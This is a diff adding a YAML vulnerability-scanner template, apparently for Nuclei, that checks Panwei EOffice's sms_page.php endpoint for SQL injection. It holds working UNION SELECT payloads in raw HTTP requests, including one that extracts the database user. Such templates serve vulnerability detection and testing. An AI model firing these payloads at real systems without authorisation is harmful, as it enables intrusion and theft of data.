@@ -1,0 +1,44 @@
+id: panwei-eoffice-sql-injection
+info:
+  name: Panwei EOffice sms_page.php SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Fanwei EOffice contains a SQL injection vulnerability in the sms_page.php endpoint, allowing attackers to execute arbitrary SQL queries and potentially gain access to sensitive information or elevated privileges.
+  tags: sql-injection
+  metadata:
+    cvss-score: 9.8
+    exploit: true
+http:
+  - raw:
+      - |
+        GET /E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x3a,md5(232),0x3a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "be83ab3ecd0db773eb2dc1b0a17836a1"
+        part: body
+  - raw:
+      - |
+        GET /E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,{{sqli}},0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    payloads:
+      sqli:
+        - "user()"
+    extractors:
+      - type: regex
+        regex:
+          - "~(.*?)~"
+        part: body
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
